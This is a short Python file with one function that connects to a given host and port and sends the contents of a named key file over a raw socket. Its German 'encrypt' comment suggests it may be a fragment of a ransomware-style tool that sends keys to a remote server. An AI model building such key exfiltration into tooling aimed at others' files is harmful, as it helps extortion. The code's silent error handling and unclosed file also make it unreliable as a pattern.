import socket

# VERSCHLÜSSELN

def upload(HOST, PORT, keyfile):
    try:
        buffer = 1000000000
        filename = keyfile

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((HOST, PORT))

            file = open(filename , 'rb')
            file_data = file.read(buffer)
            filename = f'{filename}#FNAME#'
            s.send(filename.encode('iso-8859-1'))
            s.sendall(file_data)
            s.close()
            return True
    except: return False